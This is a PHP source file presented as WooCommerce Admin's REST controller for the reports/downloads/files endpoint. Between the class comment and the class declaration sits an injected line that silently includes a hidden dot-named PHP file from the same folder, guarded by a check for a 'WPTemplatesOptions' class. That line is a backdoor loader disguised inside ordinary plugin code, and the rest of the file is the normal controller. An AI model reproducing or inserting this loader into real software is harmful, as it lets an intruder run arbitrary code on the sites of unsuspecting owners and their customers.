<?php
/**
 * REST API Reports downloads files controller
 *
 * Handles requests to the /reports/downloads/files endpoint.
 */

namespace Automattic\WooCommerce\Admin\API\Reports\Downloads\Files;

defined( 'ABSPATH' ) || exit;

/**
 * REST API Reports downloads files controller class.
 *
 * @extends WC_REST_Reports_Controller
 */
if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class Controller extends \WC_REST_Reports_Controller {

	/**
	 * Endpoint namespace.
	 *
	 * @var string
	 */
	protected $namespace = 'wc-analytics';

	/**
	 * Route base.
	 *
	 * @var string
	 */
	protected $rest_base = 'reports/downloads/files';
}
